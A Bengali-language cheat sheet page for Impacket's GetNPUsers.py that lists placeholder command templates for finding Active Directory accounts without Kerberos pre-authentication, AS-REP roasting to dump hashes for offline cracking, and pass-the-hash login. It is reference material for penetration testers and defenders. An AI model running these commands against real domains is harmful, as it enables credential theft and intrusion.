# GetNPUsers.py

> Kerberos প্রি-অথেন্টিকেশন নিষ্ক্রিয় থাকা Active Directory অ্যাকাউন্টগুলো তালিকাভুক্ত করুন, যেগুলো AS-REP roasting আক্রমণের জন্য ঝুঁকিপূর্ণ হতে পারে।
> Impacket স্যুইটের অংশ।
> আরও তথ্য: <https://github.com/fortra/impacket>।

- Kerberos প্রি-অথেন্টিকেশন নিষ্ক্রিয় থাকা ব্যবহারকারীদের তালিকাভুক্ত করুন (ডিফল্ট অ্যানোনিমাস enumeration):

`GetNPUsers.py {{ডোমেইন}}/ -usersfile {{ইউজারলিস্ট/এর/পাথ}} -dc-ip {{domain_controller_ip}} -no-pass`

- AS-REP roasting চালান এবং অফলাইন ক্র্যাকিং-এর জন্য ক্র্যাকযোগ্য হ্যাশ ডাম্প করুন:

`GetNPUsers.py {{ডোমেইন}}/ -usersfile {{ইউজারলিস্ট/এর/পাথ}} -dc-ip {{domain_controller_ip}} -no-pass -request`

- বৈধ ক্রেডেনশিয়াল দিয়ে অথেন্টিকেট করুন (যদি অ্যানোনিমাস binding নিষ্ক্রিয় থাকে):

`GetNPUsers.py {{ডোমেইন}}/{{username}}:{{password}} -usersfile {{ইউজারলিস্ট/এর/পাথ}} -dc-ip {{domain_controller_ip}}`

- পাসওয়ার্ডের পরিবর্তে pass-the-hash অথেন্টিকেশন ব্যবহার করুন:

`GetNPUsers.py {{ডোমেইন}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{ইউজারলিস্ট/এর/পাথ}} -dc-ip {{domain_controller_ip}}`

- পরবর্তী বিশ্লেষণের জন্য আউটপুট একটি ফাইলে সংরক্ষণ করুন:

`GetNPUsers.py {{ডোমেইন}}/ -usersfile {{ইউজারলিস্ট/এর/পাথ}} -dc-ip {{domain_controller_ip}} -request > {{pathname}}`
